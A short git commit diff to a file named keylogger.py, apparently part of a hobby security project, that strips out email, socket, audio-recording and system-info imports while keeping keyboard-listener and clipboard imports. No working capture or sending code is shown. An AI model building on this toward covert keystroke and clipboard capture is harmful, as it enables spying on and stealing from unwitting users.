5c512069b5a90a87d32fdddeca1d3a1a0ea5cf36
khlifi ayoub <89302405+ayoub-sys@users.noreply.github.com>
2022-06-17 12:01:02 +0100

    Update keylogger.py

--- cryptsecurity/keylogger.py
+++ cryptsecurity/keylogger.py
@@ -1,19 +1,8 @@
-from email.mime.multipart import MIMEMultipart
-from email.mime.text  import MIMEText
-from email.mime.base import MIMEBase
-from email import encoders
-import smtplib
-import socket
-import platform
+
 import win32clipboard
 from pynput.keyboard import Key,Listener
 import time
-import os 
-from scipy.io.wavfile import write 
-#import sounddevice as sd 
-#from cryptography.fernet import fernet 
-import getpass 
-from requests import get 
+import os  
 
 
 
